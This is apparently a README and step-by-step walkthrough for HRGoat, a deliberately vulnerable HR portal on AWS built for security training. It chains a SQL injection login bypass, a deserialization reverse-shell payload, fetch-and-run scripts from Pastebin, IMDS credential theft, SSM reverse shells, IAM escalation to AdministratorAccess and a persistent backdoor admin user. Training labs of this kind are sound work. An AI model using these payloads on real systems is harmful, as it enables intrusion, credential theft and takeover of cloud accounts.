## ⚠️ Security Advisory
**WARNING**: This application contains deliberate security vulnerabilities. Deploy only in isolated, controlled environments. Never use in production or connect to sensitive systems.

## About the Project
HRGoat is an intentionally vulnerable HR management portal designed to demonstrate cloud security vulnerabilities in a controlled environment. It's a comprehensive training tool created for:
- Security professionals practicing cloud-based exploitation
- DevOps engineers learning secure deployment practices
- Development teams studying secure coding
- Organizations conducting security awareness training

---

# 🎭 The Great Escape: From SQLi to Full AWS Takeover

> This project is for educational and authorized security research purposes only. Unauthorized use of these techniques is illegal and unethical.

This guide walks through a full attack lifecycle scenario from initial entry via SQL Injection to full AWS account takeover, including container escape, IAM privilege escalation, and persistence.

## Deployment with GitHub Actions

### Prerequisites
- GitHub account
- AWS account with appropriate permissions
- Required GitHub secrets:
  - `AWS_ACCESS_KEY_ID`
  - `AWS_SECRET_ACCESS_KEY`

### Deployment Steps
1. Fork this repository to your GitHub account
2. Configure AWS credentials in GitHub Secrets:
   - Navigate to "Settings" → "Secrets"
   - Add required AWS credentials
3. Deploy infrastructure:
   - Go to "Actions" tab
   - Select "Create Infrastructure and Deploy Application"
   - Click "Run workflow"
4. Access application using provided URLs in workflow output:
   - Application Load Balancer URL
   - EC2 instance IP addresses
   - Jenkins server URL

---

## 🧨 Vulnerability Overview

1. **SQL Injection** – Employee search functionality can be exploited for unauthorized data access.
2. **Insecure Deserialization** – Bulk upload feature leads to remote code execution.
3. **Container Escape** – Poor container isolation allows attacker to pivot to EC2 host.
4. **Jenkins Exploitation** – Publicly exposed CI/CD tool allows system-level compromise.
5. **AWS IAM Privilege Escalation** – Misconfigured roles allow privilege chaining and admin policy attachment.

---

## 🔥 Exploitation Walkthrough

*A detailed, step-by-step demonstration of exploiting these vulnerabilities is provided in the `docs/exploitation-walkthrough.md` file.* Screenshots, reverse shells, metadata token access, IAM abuse, and persistence techniques are covered thoroughly.

---

## Disclaimer
This software is provided for educational purposes only. Unauthorized security testing is illegal. The author is not responsible for any misuse of this software.


## 🏴‍☠️ The Adventure Begins
Once upon a time, in a land of misconfigured cloud environments, a daring security researcher set out on a quest to explore the depths of vulnerabilities. What started as a simple SQL injection led to an ultimate privilege escalation inside AWS. Let's follow the trail!

---

## 🎬 Step 1: The Gate is Wide Open (SQL Injection)
<img width="920" height="776" alt="image" src="https://github.com/user-attachments/assets/cede484f-1985-4043-a39a-2025eec6c66c" />

Our journey starts at a login screen. With a bit of old-school magic, we bypass authentication using:
```sql
' or '1'='1' -- # Make sure to have space after the dashes
```

Achievement unlocked! 🎮 Admin powers activated - let the real adventure begin!

---

## 🎭 Step 2: Exploiting Insecure Deserialization

Time to level up with a legendary combo move! We're about to execute the 'Insecure Deserialization Exploit' - a boss-level technique that requires precise timing.
First things first, adventurer - make sure your command center (reverse shell listener) is powered up and ready to catch the incoming connection. Think of it as setting up your base camp before the final raid!

 Set up your listener on the remote machine to catch the incoming connection:
```bash
nc -lvnp 4444
```
<img width="625" height="237" alt="image" src="https://github.com/user-attachments/assets/3ce8b72e-9bb3-4d03-95c9-b1b721cecd25" />

While that's running, grab the NAT address of the machine - you'll need it for the next phase of the challenge.

Navigate to System Tools and then Bulk Employee Upload

<img width="1965" height="1009" alt="image" src="https://github.com/user-attachments/assets/f4747571-23d6-46ea-8c4f-9c5840d09a2d" />


Access the `examples/rce_exploit.json` file, update the `ATTACKER_IP` field with your listener’s IP address and the `REMOTE_PORT` field with the port you’ve configured, then insert the modified JSON into the Bulk Employee Upload function. After applying these changes, trigger the exploit payload to ensure the traffic is directed to your listener.

```JSON
{
  "name": "Stealthy User",
  "position": "Finance",
  "department": "HQ",
  "email": "whoami2@HRgoat.com",
  "phone": "555-000-0000",
  "location": "Remote",
  "hire_date": "2023-01-01",
  "status": "active",
  "manager": "None",
  "salary": 0,
  "bio": "This is a non-blocking test.",
  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const { spawn } = require('child_process'); const shell = spawn('/bin/bash', ['-c', '/bin/bash -i > /dev/tcp/ATTACKER_IP/REMOTE_PORT 0<&1 2>&1'], { detached: true, stdio: 'ignore' }); shell.unref(); return 'shell spawned and detached';}()\"}"
}
```

---

## 🚀 Step 3: Inside the Container!

We’ve successfully landed in the container. 
<img width="858" height="244" alt="image" src="https://github.com/user-attachments/assets/eba78865-cc42-4d41-9f5e-9e7a50111bce" />



---

## 🛠️ Step 4: Breaking Out of the Container

Your next step is to pull and execute a script crafted to capture the host token while slipping past the container boundary. Navigate to the examples directory and locate export_token.sh. 
Once found, upload it to Pastebin or a similar service so you can easily fetch it back onto the target machine for execution.

```bash
cd /tmp

wget -O get_token.sh https://pastebin.com/raw/[your uploaded URL]   // for example - wget -O get_token.sh https://pastebin.com/raw/r3P5TVit
sed -i 's/\r$//' get_token.sh
chmod +x get_token.sh
./get_token.sh
```
<img width="1060" height="1126" alt="image" src="https://github.com/user-attachments/assets/c4a8688e-968d-4680-b5fe-fb800063d9df" />

Now we got the tokens

---

## 🔑 Step 5: Container Escape and Host IAM Credential Extraction

This script is designed as a** container escape and AWS credential extraction tool**. Its main purpose is to bypass the container’s network isolation, reach the EC2 Instance Metadata Service (IMDS), and retrieve temporary IAM credentials from the host instance. 
It does this by using nsenter to jump from the container network namespace into the host’s network namespace, then performing a series of steps to request an IMDSv2 token, identify the IAM role, and extract the associated credentials. The script includes logging, optional debug output, and parsing of the credentials into environment variables so they can be used immediately for AWS API access.

Once the script completes successfully, the attacker will have the AWS AccessKeyId, SecretAccessKey, and SessionToken for the target instance.

**Next steps for the attacker (these commands must be executed from the local terminal, not on the remote host):**
Export the retrieved credentials as environment variables in your **local terminal**:

```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```
<img width="1737" height="1259" alt="image" src="https://github.com/user-attachments/assets/5f68ff2a-f6a5-4cd4-8e42-5f77540aa40f" />

<img width="1534" height="342" alt="image" src="https://github.com/user-attachments/assets/e27d6875-146f-42ce-b51e-7c308c1e1c1b" />


---

## 🏠 Step 6: Using EC2 Credentials Locally

Now, let’s shift operations to our local machine:

```bash
aws sts get-caller-identity
```
<img width="1227" height="174" alt="image" src="https://github.com/user-attachments/assets/a2cf0c25-b17f-46f0-9d67-2da9dd7217b5" />

![image](https://github.com/user-attachments/assets/37bd2d45-44a5-414f-98ce-0d501f4d1fc7)

We have AWS credentials. Time to enumerate our permissions!

---

## 🔍 Step 7: Mapping Out AWS Permissions

Run `aws-perm-check.sh` from the `examples` folder to identify what actions we can perform (execute it from a local machine that has the user context where you've exported the credentials to).
```bash
cd /tmp

wget -O aws-perm-check.sh https://pastebin.com/raw/[your uploaded URL]   // for example - wget -O aws-perm-check.sh https://pastebin.com/raw/jqZ9Kx6Z
sed -i 's/\r$//' aws-perm-check.sh
chmod +x aws-perm-check.sh
./aws-perm-check.sh
```

<img width="1677" height="1127" alt="image" src="https://github.com/user-attachments/assets/603128d4-ca7b-4a5d-a8ec-668f0cba9726" />


We find permissions allowing us to list EC2 instances and send SSM commands. Perfect for lateral movement!

---

## 📡 Step 8: Moving Laterally with SSM

To get an overview of your EC2 instances, you can run:
```bash
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" --query 'Reservations[*].Instances[*].[InstanceId, Tags[?Key==`Name`].Value|[0], State.Name]' --output table
```
<img width="1752" height="282" alt="image" src="https://github.com/user-attachments/assets/8de49a9e-6dc3-46fc-bbe5-074a9fae1b87" />

If your environment uses a region other than us-east-1, you can enumerate all EC2 instances across every region using the script at `examples\check_aws_instances.sh`.
<img width="1404" height="996" alt="image" src="https://github.com/user-attachments/assets/d7a602d6-ac9b-4aab-bd69-6ebf0a1cbeb7" />


Once you identify an instance of interest, the next step is to gain access. You can either open a new listener on a different port or reuse a previous one. 
The goal is to connect to a different machine (Jenkins machine) than your current session, allowing you to explore other IAM roles for potential privilege escalation.

From your local terminal, run the following command, making sure to update the instance ID, REMOTE_IP, and REMOTE_PORT

```bash
aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0ef5488e604d5bd79" --parameters 'commands=["bash -c '\''bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1'\''"]' --region us-east-1
```
<img width="1024" height="244" alt="image" src="https://github.com/user-attachments/assets/95c0b508-554e-4d64-a91f-269cf4486e19" />

Now we have a shell on a second machine. Time to escalate further!

---

## 🏆 Step 9: Privilege Escalation

From the new EC2 instance, repeat the credential extraction process:
```bash
#!/bin/bash

TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

echo "$CREDS" | jq -r '. | "export AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nexport AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nexport AWS_SESSION_TOKEN=\(.Token)"'

```
<img width="1184" height="596" alt="image" src="https://github.com/user-attachments/assets/682bda11-3eed-4efc-9911-6cf5e373541a" />

Fetch roles and credentials, and analyze the permissions with the previous script.
<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/edd9c51e-f342-4a34-87a0-37e43caf14fa" />

---

## 🎯 Step 10: Escalating to Administrator

We find that `hrgoat-jenkins-role` has IAM modification permissions. 
<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/32cf8865-a1d5-4ea9-8ed1-6202bc1da743" />


Let’s exploit it, make sure to use the appropriate region:
```bash
aws iam attach-role-policy --role-name 'hrgoat-jenkins-role-us-east-1' --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
```
![image](https://github.com/user-attachments/assets/a7a8846e-78ee-4e7f-84c8-f791b4aa5797)

Check if it worked:
```bash
aws iam list-attached-role-policies --role-name hrgoat-jenkins-role
aws iam list-users
```
![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)

We have admin rights! 🏆

---

## 🚪 Step 11: Planting a Persistent Admin User

Let’s create a backdoor admin:
```bash
aws iam create-user --user-name backdoor-admin
aws iam create-access-key --user-name backdoor-admin
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-user-policies --user-name backdoor-admin
```
### Create New User
![image](https://github.com/user-attachments/assets/18bb0ec6-09a2-4c62-9bf2-3e5d48e5da1e)

### Create User Access Key
![image](https://github.com/user-attachments/assets/28029293-8b4e-4afe-b60d-cdc5b7c3b677)

### Assign permissions and verify it worked
 ![image](https://github.com/user-attachments/assets/c53dc66b-333e-40e3-9af5-004cc4eab627)


Success! Now, full control of the AWS environment is ours.

---

## 🎉 Conclusion

From a simple SQLi to full AWS environment control, we navigated through multiple security misconfigurations and privilege escalations. This journey highlights the importance of:
- Proper input validation to prevent SQLi
- Secure deserialization practices
- Restricting container privileges
- Securing AWS metadata service access
- Applying least privilege principles in AWS IAM

---

💡 **For Defensive Countermeasures & Hardening Tips, see** `SECURITY.md` 🚧
